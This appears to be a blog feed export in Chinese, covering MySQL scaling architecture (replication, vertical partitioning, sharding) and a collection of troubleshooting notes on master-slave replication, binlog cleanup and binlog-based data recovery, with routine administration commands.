数据库架构1、简单的MySQL主从复制:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL的主从复制解决了数据库的读写分离，并很好的提升了读的性能，其图如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其主从复制的过程如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是，主从复制也带来其他一系列性能瓶颈问题： 写入无法扩展 写入无法缓存 复制延时 锁表率上升 表变大，缓存率下降 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那问题产生总得解决的，这就产生下面的优化方案，一起来看看。 2、MySQL垂直分区&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果把业务切割得足够独立，那把不同业务的数据放到不同的数据库服务器将是一个不错的方案，而且万一其中一个业务崩溃了也不会影响其他业务的正常进行，并且也起到了负载分流的作用，大大提升了数据库的吞吐能力。经过垂直分区后的数据库架构图如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而，尽管业务之间已经足够独立了，但是有些业务之间或多或少总会有点联系，如用户，基本上都会和每个业务相关联，况且这种分区方式，也不能解决单张表数据量暴涨的问题，因此为何不试试水平分割呢？ 3、MySQL水平分片（Sharding）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一个非常好的思路，将用户按一定规则（按id哈希）分组，并把该组用户的数据存储到一个数据库分片中，即一个sharding，这样随着用户数量的增加，只要简单地配置一台服务器即可，原理图如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如何来确定某个用户所在的shard呢，可以建一张用户和shard对应的数据表，每次请求先从这张表找用户的shard id，再从对应shard中查询相关数据，如下图所示：]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 主从同步问题集]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F24.%20mysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98%E9%9B%86%2F</url>
    <content type="text"><![CDATA[mysql主从同步问题集&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在InnoDB引擎下发现，Mysql的主从热备存在数据不一致的问题，一些数据没有成功同步到备机。在use databases后，更新的表必须是当前选择的database才同步。譬如连上Mysql服务后操作： 12USE test2; UPDATE client SET name='test' WHERE uid=1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据未能同步到备机，而使用use test后，才可以成功同步，如下方式： 12USE test; UPDATE client SET name='test' WHERE uid=1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仔细看Mysql手册，发现同步启动选项中还有玄机，只设置replicate-do-db指定同步数据库还不够，是没有设置replicate-wild-do-table导致的跨库同步问题。Mysql默认是同步指定数据库下的更新操作，若要跨库操作更新同步，就必须指定replicate-wild-do-table参数。下面是Mysql手册中对replicate-do-db和replicate-wild-do-table启动选项的说明： –replicate-do-db=db_name告诉slave只同步那些缺省数据库是 db_name (也就是用 USE 选中的)的语句。想要指定更多的数据库，只需多次使用该选项，每次指定一个数据库。注意，类似 UPDATE some_db.some_table SET foo=’bar’ 这样的跨库操作语句以及没有选中数据库的操作都不会被同步。如果必须使用跨库操作，要确保使用MySQL 3.23.28或更高，并且使用 –replicate-wild-do-table=db_name.% 选项。请仔细阅读最后面的注意事项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是一个不能按照预期工作的例子：如果启动slave时使用 –replicate-do-db=sales 选项，并且在master上执行下列语句，那么这个 UPDATE 语句不会被同步： 12USE prices; UPDATE sales.january SET amount=amount+1000; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要同步跨库操作，只需使用 –replicate-wild-do-table=db_name.% 选项。这个”只检查缺省数据库”特性的主要原因是因为想要单从一个语句中判断是否要被同步比较困难(例如，使用多表 DELETE 或者 UPDATE，这就跨库了)。不过想要检查是否是缺省数据库却很快。 –replicate-wild-do-table=db_name.tblname限制slave只同步那些匹配指定模式的数据表。模式中可以包含通配符 % 和 ``，它们的含义和 LIKE 模式一样。想要指定更多的数据表，只需多次使用该选项，每次指定一个数据表。请仔细阅读最后面的注意事项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： –replicate-wild-do-table=foo%.bar% 会同步所有以 foo 开头的数据库下的以 bar 开头的数据表上的更新操作。 如果匹配模式是 %，则匹配所有的表名，且应用到数据库级语句(CREATE DATABASE, DROP DATABASE,和 ALTER DATABASE)。例如，使用 –replicate-wild-do-table=foo%.% 选项的话，所有匹配 foo% 模式的数据库级操作都会被同步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想要在数据库/表模式中包含原义通配符，需要用反斜杠来转义它们。例如，想要同步 myown%db 数据库下的所有表，但是不想同步 my1ownAABCdb 数据库下的表，就需要转义字符 ``： –replicate-wild-do-table=my\_own\%db。如果是在命令行中使用这个选项，就可能需要两个反斜杠来转义，这依赖于命令行解释器。例如，在 bash shell下，就需要输入： –replicate-wild-do-table=my\\_own\\%db。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还存在一些问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不管有没有replicate-wild-do-table选项，更新操作必须是mysql连接已经有选择的数据库了才进行，譬如新建的mysql(新连接是没有默认选择的database的)连接中执行： 1UPDATE test.client SET name='test' WHERE uid=1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这条更新无法同步到备机，必须在update前use database操作，该database必须是replicate-wild-do-table中指定的database。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保险的解决方式：连接上mysql后，调用mysql_select_db()选择数据库，之后进行的更新操作就可以自动同步了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SQL模式匹配 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SQL的模式匹配允许你使用“_”匹配任何单个字符，而“%”匹配任意数目字符(包括零个字符)。在MySQL中，SQL的模式缺省是忽略大小写的。下面显示一些例子。注意在你使用SQL模式时，你不能使用=或!=；而使用LIKE或NOT LIKE比较操作符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在my.cnf中設定master是錯誤的，你会发现在设置好重启后并没有按照之前的方式来运行。 1234master-host = 192.168.10.2 master-user = repl master-password = slavepass master-port = 3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请在mysql下执行底下指令 1234mysql&gt;CHANGE MASTER TO MASTER_HOST=’192.168.10.2′, MASTER_USER=’repl’, MASTER_PASSWORD=’slavepass’; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看主从服务状态的指令： 123mysql&gt; show slave status\G mysql&gt; show master status\G mysql&gt; show master logs; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql主从复制碰到(server_errno=1236)解决过程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天上论坛发现新发表的帖子无法正常显示(论坛数据库采用Mysql主从复制进行读写分离方案)，马上想到可能主从复制同步上出现问题，同一时间收到同事消息说数据库的主复制出现故障重启了，这时找到事故原因主数据库重启了会导致从数据库数据复制同步上延后，过一段时间SSH到从数据库上show slave status\G;查看状态显示 1234567 Slave_IO_Running: NO Slave_SQL_Running: Yes ... Last_Errno: 0 Last_Error: ... Seconds_Behind_Master: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从状态信息来看数据同步没有延后也没有报任何的错误，但Slave_IO_Running: NO显示同步IO进程失败。根据以往经验会先重启一下Slave后在show slave status\G;看一下是否会恢复正常，Slave_IO_Running: NO问题还是没有解决于是查看一下Mysql的错误日志发现： 123456090605 9:13:20 [Note] Slave SQL thread initialized, starting replication in log ‘mysql-bin.000102′ at position 1029244974, relay log ‘./xxx-relay-bin.000634′ position: 98 090605 9:13:20 [Note] Slave I/O thread: connected to master ’slave163@192.168.0.131:3306′, replication started in log ‘mysql-bin.000102′ at position 1029244974 090605 9:13:20 [ERROR] Error reading packet from server: Client requested master to start replication from impossible position ( server_errno=1236) 090605 9:13:20 [ERROR] Got fatal error 1236: ‘Client requested master to start replication from impossible position’ from master when reading data from binary log 090605 9:13:20 [Note] Slave I/O thread exiting, read up to log ‘mysql-bin.000102′, position 1029244974 090605 9:13:52 [Note] Error reading relay log event: slave SQL thread was killed &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在网上查了很多资料可能因为mysql-bin.000102日志文件中并没有1029244974这个位置，vi打开mysql-bin.000102日志文件搜索1029244974确实没有搜到内容，但为什么主数据库意外的重启会导致Slave上读取位置的错误，记得以前主数据库也手动重启过，Slave上也没有出现过这种问题。解决方法是使用CHANGE MASTER TO命令就是让Slave跳过mysql-bin.000102日志文件1029244974这个位置直接到下一个日志文件： 123SLAVE STOP; CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000103', MASTER_LOG_POS=0; SLAVE START; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是这样如果mysql-bin.000102日志文件的内容没有同步完会导致主数据库与从数据库的内容不一致，那何不把位置向前移呢。 123SLAVE STOP; CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000102', MASTER_LOG_POS=1019244974; SLAVE START; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;于是试了一下，果然Slave_IO_Running: YES同步成功跳过了mysql-bin.000102日志文件1029244974这个位置并继续读取下一个位置，这样从数据库也不会丢失数据和主数据库保持数据的一致，如果my.cnf中没有加slave-skip-errors参数跳过一些错误的话，同步位置向前移会导致一些数据重新插入到表中报主键重复错误加上参数就可以成功跳过这些错误了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天一台数据库的slave报 Slave_IO_Running: No的错误, 登陆上机器执行. 123&gt;slave stop; &gt;SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1; &gt;slave start; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看slave的状态, 依然是Slave_IO_Running: No &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看mater错误日志, 发现有一段奇怪的日志如下: 1Got timeout reading communication packets &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看master的错误日志, 那就更奇怪了: 1234090430 15:49:38 [Note] Slave I/O thread: connected to master 'user@192.16.0.123:3306',replication started in log 'xxx-bin.000815' at position 3776386 090430 15:49:38 [ERROR] Error reading packet from server: Client requested master to start replication from impossible position ( server_errno=1236) 090430 15:49:38 [ERROR] Got fatal error 1236: 'Client requested master to start replication from impossible position' from master when reading data from binary log 090430 15:49:38 [Note] Slave I/O thread exiting, read up to log 'xxx-bin.000815', position 3776386 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能是xxx-bin.000815这个文件有问题, 看了一下它的大小，果然没有3776386这个位置，slave读的时候肯定是错误了， 到底为什么会这样就不清楚了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法就是读取下一个bin-log了 1234&gt;slave stop; &gt;CHANGE MASTER TO MASTER_LOG_FILE='xxx-bin.000816',MASTER_LOG_POS=0; &gt;slave start; &gt;show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到Slave_IO_Running: Yes, 问题解决. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从库配置文件my2.ini 123port=3307 datadir=”” server-id=2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启用从库日志，这样可以进行链式复制 1log-slave-updates &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从库是否只读，0表示可读写，1表示只读 1read-only=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只复制某个表 1replicate-do-table=tablename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只复制某些表(可用匹配符) 1replicate-wild-do-table=tablename% &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只复制某个库 1replicate-do-db=dbname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只复制某些库 1replicte-wild-do-db=dbname% &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不复制某个表 1replicate-ignore-table=tablename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不复制某些表 1replicate-wild-ignore-table=tablename% &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不复制某个库 1replicate-ignore-db=dbname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制完的sql语句是否立即从中继日志中清除，1表示立即清除 1relay-log-purge=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从服务器主机，用于show slave hosts生成从库清单 1report-host=hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从库的数据目录下，有几个和复制相关的文件需要说明一下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*-reloay-bin.* 从主库同步过来的Bin log文件，也叫中继日志 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master.info 主库帐号信息和同步信息，这里记录了复制用户名和密码，需要保护好权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;relay-log.info 跟踪执行同步过来的Bin log的执行情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过show processlist可以查看主从库用于复制的相关进程(在windows上实际实现为线程)的信息 123456789101112131415161718192021222324252627282930313233343536mysql&gt; show processlist\G mysql&gt; CHANGE MASTER TO -&gt; MASTER_HOST='master_host_name', -&gt; MASTER_USER='replication_user_name', -&gt; MASTER_PASSWORD='replication_password', -&gt; MASTER_LOG_FILE='recorded_log_file_name', -&gt; MASTER_LOG_POS=recorded_log_position; ``` &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;注意：从服务器复制时，会在其数据目录中发现文件master.info和HOSTNAME-relay-log.info。状态文件保存在硬盘上，从服务器关闭时不会丢失。下次从服务器启动时，读取这些文件以确定它已经从主服务器读取了多少二进制日志，以及处理自己的中继日志的程度。不要移除或编辑这些文件，除非你确切知你正在做什么并完全理解其意义。即使这样，最好是使用CHANGE MASTER TO语句。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;为了保证以后binglog及时写入，将主库sync_binlog变量设置1。 ----&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;MYSQL主从同步时出现”Client requested master to start replication from impossible position”错误的解决方法: &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;这个错误是因为从服务器请求一个错误的位置而引起的.比如主服务器上的BLIN LOG里没有这个POSITION. &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;解决原理: &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;从相关的BIN LOG 里最后一个日志位置,与从服务器上的日志对比,如果LOG里最后位置比错误的位置大,那么,说明中间可能有断点,需要把从服务器的位置向前调,多试几次.如果在LOG里最后的位置比从服务器指出的位置还小,那么只要把从服务器的位置设置成LOG的最后位置就可以了. ```bashmysqlbinlog mysql-log-bin.000112 &gt;log.sql tail -f log.sql # at 568380594 #110616 3:10:16 server id 1 end_log_pos 568380757 Query thread_id=123899 exec_time=0 error_code=0 use thecheap_topshoppinguscom/*!*/; SET TIMESTAMP=1308226216/*!*/; DELETE FROM `thecheap_topshoppinguscom`.`zm_sessions` WHERE expiry &lt; 1308224416 /*!*/; DELIMITER ; # End of log file ROLLBACK /* added by mysqlbinlog */; /*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现这个位置比从服务器上的位置(568397810)还小,只要设置成最后位置,然后启动SLAVE就可以了. 123CHANGE MASTER TO MASTER_LOG_FILE=’mysql-log-bin.000112′, MASTER_LOG_POS=568380594; –read-only选项该选项让从服务器只允许来自从服务器线程或具有SUPER权限的用户的更新，可以确保从服务器不接受来自客户的更新。在测试过程中遇到了read-only的问题，发现写操作因为read-only这个选项的开启，而不能够成功执行。而通过带super权限的用户执行带修改性质的语句时，是能成功执行的。查找了下资料，才了解read-only的真正含义和用法：–read_only Make all non-temporary tables read-only, with the exception for replication (slave) threads and users with the SUPER privilege. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SUPER privilege : &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;The SUPER privilege enables an account to use CHANGE MASTER TO , KILL or mysqladmin kill to kill threads belonging to other accounts (you can always kill your own threads), PURGE BINARY LOGS , configuration changes using SET GLOBAL to modify global system variables, the mysqladmin debug command, enabling or disabling logging, performing updates even if the read_only system variable is enabled, starting and stopping replication on slave servers, specification of any account in the DEFINER attribute of stored programs and views, and enables you to connect (once) even if the connection limit controlled by the max_connections system variable is reached. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;To create or alter stored routines if binary logging is enabled, you may also need the SUPER privilege, as described in Section 18.6, “Binary Logging of Stored Programs” . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;read-only选项：对所有的非临时表进行只读控制。但是有两种情况例外： 对replication threads例外，以保证slave能够正常的进行replication。 对于拥有super权限的用户，可以ignore这个选项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SUPER 权限 ： 可以有change master to, kill其他用户的线程的权限。 Purge binary logs 来删除binary log, set global来动态设置变量的权限。 执行mysqladmin debug命令，开启或者关闭log，在read-only打开时执行update/insert操作。 执行start slave, stop slave. 当连接数已经达到max_connections的最大值时，也可以连接到server。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql 主从同步状态不一致问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;方法一：是强制性从某一个点开始同步，会有部分没有同步的数据丢失，后续主服务器上删除记录同步也会有一些错误信息，不会影响使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;方法二：是设置’set GLOBAL SQL_SLAVE_SKIP_COUNTER=1;’，但这样做不一定会有效果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主从不能同步: 1show slave status; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错:Error xxx dosn’t exist 123show slave status\G:Slave_SQL_Running: NOSeconds_Behind_Master: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法: 123stop slave;set global sql_slave_skip_counter =1 ;start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后Slave会和Master去同步 主要看: 12Slave_IO_Running: YesSlave_SQL_Running: Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Seconds_Behind_Master是否为0，0就是已经同步了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还需要做的一些优化与监视: 1234show full processlist; //查看mysql当前同步线程号skip-name-resolve //跳过dns名称查询，有助于加快连接及同步的速度max_connections=1000 //增大Mysql的连接数目，(默认100)max_connect_errors=100 //增大Mysql的错误连接数目,(默认10) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看日志一些命令 show master status\G;在这里主要是看log-bin的文件是否相同。 1show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这里主要是看: 12Slave_IO_Running=YesSlave_SQL_Running=Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果都是Yes,则说明配置成功. 在master上输入show processlist\G; 12345678910mysql&gt; SHOW PROCESSLIST\G*************************** 1. row ***************************Id: 2User: rootHost: localhost:32923db: NULLCommand: Binlog DumpTime: 94State: Has sent all binlog to slave; waiting for binlog to be updatedInfo: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出现Command: Binlog Dump,则说明配置成功. 123456789101112131415161718192021stop slave #停止同步start slave #开始同步，从日志终止的位置开始更新。SET SQL_LOG_BIN=0|1 #主机端运行，需要super权限，用来开停日志，随意开停，会造成主机从机数据不一致，造成错误SET GLOBAL SQL_SLAVE_SKIP_COUNTER=n # 客户端运行，用来跳过几个事件，只有当同步进程出现错误而停止的时候才可以执行。RESET MASTER #主机端运行,清除所有的日志，这条命令就是原来的FLUSH MASTERRESET SLAVE #从机运行，清除日志同步位置标志，并重新生成master.info虽然重新生成了master.info,但是并不起用，最好，将从机的mysql进程重启一下，LOAD TABLE tblname FROM MASTER #从机运行，从主机端重读指定的表的数据，每次只能读取一个，受timeout时间限制，需要调整timeout时间。执行这个命令需要同步账号有 reload和super权限。以及对相应的库有select权限。如果表比较大，要增加net_read_timeout 和 net_write_timeout的值LOAD DATA FROM MASTER #从机执行，从主机端重新读入所有的数据。执行这个命令需要同步账号有reload和super权限。以及对相应的库有select权限。如果表比较大，要增加net_read_timeout 和 net_write_timeout的值CHANGE MASTER TO master_def_list #在线改变一些主机设置，多个用逗号间隔,比如CHANGE MASTER TO MASTER_HOST='master2.mysql.com', MASTER_USER='replication', MASTER_PASSWORD='password'MASTER_POS_WAIT() #从机运行SHOW MASTER STATUS #主机运行，看日志导出信息SHOW SLAVE HOSTS #主机运行，看连入的从机的情况。SHOW SLAVE STATUS (slave)SHOW MASTER LOGS (master)SHOW BINLOG EVENTS [ IN 'logname' ] [ FROM pos ] [ LIMIT [offset,] rows ]PURGE [MASTER] LOGS TO 'logname' ; PURGE [MASTER] LOGS BEFORE 'date' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;清理binlog日志文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现放数据库的分区磁盘激增了40多G，一路查看下来，发现配置好主从复制以来到现在的binlog就有40多G，原来根源出在这里，查看了一下 my.cnf，看到binlog的size是1G就做分割，但没有看到删除的配置，在mysql里show了一下variables， 1mysql&gt; show variables like '%log%'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查到了 1| expire_logs_days | 0 | &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个默认是0，也就是logs不过期，这个是一个global的参数，所以需要执行 1set global expire_logs_days=8; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样8天前的log就会被删除了，如果有回复的需要，请做好备份工作，但这样设置还不行，下次重启mysql了，配置又恢复默认了，所以需在my.cnf中设置： 1expire_logs_days = 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要恢愎数据库以前的资料，执行：show binlog events; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于数据量很多，查看起来很麻烦，所以应该适当删除部分可不用的日志。并且如果使用的时间足够长的话，会把我的硬盘空间都给吃掉。 登录系统，/usr/bin/mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用mysql查看日志 12345678mysql&gt; show binary logs;+—————-+———–+| Log_name | File_size |+—————-+———–+| mysql-bin.000001 | 150462942 || mysql-bin.000002 | 120332942 || mysql-bin.000003 | 141462942 |+—————-+———–+ 删除bin-log(删除mysql-bin.000003之前的而没有包含mysql-bin.000003) 123mysql&gt; purge binary logs to ‘mysql-bin.000003′;Query OK, 0 rows affected (0.16 sec) 查询结果(现在只有一条记录了.) 12345678910mysql&gt; show binlog events\Gmysql&gt; show binary logs;+—————-+———–+| Log_name | File_size |+—————-+———–+| mysql-bin.000003 | 106 |+—————-+———–+1 row in set (0.00 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(删除的其它格式运用!) 12PURGE &#123;MASTER | BINARY&#125; LOGS TO ‘log_name’PURGE &#123;MASTER | BINARY&#125; LOGS BEFORE ‘date’ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于删除列于在指定的日志或日期之前的日志索引中的所有二进制日志，这些日志也会从记录在日志索引文件中的清单中被删除，这样被给定的日志成为第一个。例如： 12PURGE MASTER LOGS TO ‘mysql-bin.010′;PURGE MASTER LOGS BEFORE ‘2008-06-22 13:00:00′; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;清除3天前的 binlog 1PURGE MASTER LOGS BEFORE DATE_SUB( NOW( ), INTERVAL 3 DAY); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BEFORE变量的date自变量可以为’YYYY-MM-DD hh:mm:ss’格式。MASTER和BINARY是同义词。如果您有一个活性的从属服务器，该服务器当前正在读取您正在试图删除的日志之一，则本语句不会起作用，而是会失败，并伴随一个错误。不过，如果从属服务器是休止的，并且您碰巧清理了其想要读取的日志之一，则从属服务器启动后不能复制。当从属服务器正在复制时，本语句可以安全运行。您不需要停止它们。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要清理日志，需按照以下步骤： 在每个从属服务器上，使用SHOW SLAVE STATUS来检查它正在读取哪个日志。 使用SHOW MASTER LOGS获得主服务器上的一系列日志。 在所有的从属服务器中判定最早的日志。这个是目标日志。如果所有的从属服务器是更新的，这是清单上的最后一个日志。 制作您将要删除的所有日志的备份。 清理所有的日志，但是不包括目标日志。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面讲一下怎么从二进制文件恢复数据, 假如不小心执行了drop table xxx_db, 假如你保留了完整的二进制日志的话, 先不要冒汗, 这是可以恢复的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先看看日志 1&gt;mysqlbinlog /diskb/bin-logs/xxx_db-bin.000001 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到执行create table xxx_db之后和drop table xxx_db之前的position, 假如是20, 1000. 1&gt;mysqlbinlog --start-position="4" --stop-position="1000" /diskb/bin-logs/xxx_db-bin.000001 | mysql -u root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一种办法是根据日期来恢复 1&gt;mysqlbinlog --start-datetime="2010-09-14 0:20:00" --stop-datetim="2010-09-15 01:25:00" /diskb/bin-logs/xxx_db-bin.000001 | mysql -u root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果相关的语句不在同一个binlog文件里，则需要从不同的文件来恢复。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果MySQL服务器上有多个要执行的二进制日志，安全的方法是在一个连接中处理它们。下面是一个说明什么是不安全的例子： 12shell&gt; mysqlbinlog hostname-bin.000001 | mysql # DANGER!!shell&gt; mysqlbinlog hostname-bin.000002 | mysql # DANGER!! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用与服务器的不同连接来处理二进制日志时，如果第1个日志文件包含一个CREATE TEMPORARY TABLE语句，第2个日志包含一个使用该临时表的语句，则会造成问题。当第1个mysql进程结束时，服务器撤销临时表。当第2个mysql进程想使用该表时，服务器报告 “不知道该表”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想避免此类问题，使用一个连接来执行想要处理的所有二进制日志中的内容。下面提供了一种方法： 1shell&gt; mysqlbinlog hostname-bin.000001 hostname-bin.000002 | mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或： 123shell&gt; mysqlbinlog hostname-bin.000001 &gt; /tmp/statements.sqlshell&gt; mysqlbinlog hostname-bin.000002 &gt;&gt; /tmp/statements.sqlshell&gt; mysql -e "source /tmp/statements.sql" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql主从重新同步’binlog’日志 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;binlog中有一个位置(position)变量，可用于控制其工作进程。 从’slave’在某个’position’之后停止同步 1START SLAVE UNTIL MASTER_LOG_FILE='xxxxx', MASTER_LOG_POS=yyyyyy; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：在执行前要确定从库的同步已停。 重新从某一’position’后同步数据 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;笔者所碰到的一个现象：在一台繁忙的主库上，其传输过来的语句在从库没有完全得到执行，从而导致一分多钟的数据丢失(这么多年第一次碰到，事后通过分析binlog日志文件才发现，从库的状态居然是正常的)。STOP SLAVE; 12change master to master_host='master',master_user='user',master_password='passwd',master_log_file='mysql-bin.file',master_log_pos=prev_position;START SLAVE; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样可以从出问题的时间点靠前一点的’position’开始重新同步’sql‘操作。但这样会报错，因为之前有数据存在了。诸如此类： 12Last-Errno: 1062Last-Error: Error 'Duplicate entry '15386' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;键重复了，必须跳过才能继续。 1stop slave; set global sql_slave_skip_counter=1; start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者在’my.cnf’文件中指定该错误跳过， 1--slave-skip-errors=xxx,yyy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;须重启服务器使其生效。常见问题及操作： 12345Error: 1062 SQLSTATE: 23000 (ER_DUP_ENTRY) Message: Duplicate entry ‘%s’ for key %dYou can skip also other type of errors, but again don’t do this unless you understand very well what those queries are and what impact they have on your data:slave-skip-errors=[err_code1,err_code2,...|all] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错相关的更多信息，请参考：http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：如果’xxx’为’all’的话，则表示跳过所有错误并继续，但这并不是个好的建议。这就很必要将从库设定为只读(read_only)且用非特权用户来访问它。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;官方文档有关于它的(replication-slave)更多参考：http://dev.mysql.com/doc/refman/5.0/en/replication-options-slave.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q. No argument was provided to –log-bin, and –log-bin-index was not used; so replication may break when this MySQL server acts as a master and has his hostname changed!! Please use ‘–log-bin=mysql-bin’ to avoid this problem. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A: 在my.cnf 的[mysqld]中加入 log-bin=mysql-bin 